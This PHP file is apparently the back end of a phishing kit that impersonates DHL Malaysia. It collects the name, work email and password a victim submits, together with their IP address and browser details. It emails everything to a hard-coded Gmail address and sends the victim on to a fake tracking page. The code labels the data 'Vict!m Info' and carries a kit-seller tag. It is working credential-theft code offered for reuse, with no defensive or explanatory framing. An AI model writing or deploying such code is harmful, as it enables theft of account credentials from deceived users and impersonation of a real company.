<?php
require("hi4.php"); 
if($_POST["aponi"] != "" and $_POST["wkoreui"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Online Info-----------------------\n";
$message .= "Full Name:  ".$_POST['aponi']."\n";
$message .= "Work Email:  ".$_POST['wkoreui']."\n"; 
$message .= "Password:  ".$_POST['santisj']."\n";
$mind = $_POST['wkoreui'];
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------ROLX FUDPAGES [.] RU --------------|\n";
//change ur email here
$send = "ychoy77@gmail.com";
$subject = "Company DHL Malaysia $ip";
$headers = "From: DHL is Going GAG <customer-support@obxn-kekreio.org>";
$headers .= $_POST['forneio']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail("$send", "$subject", $message);   
}

  header ("Location: re-tracking.html?email=$mind&376352733=92862625342%487return-Fail");
}else{
header ("Location: index.php");
}

?>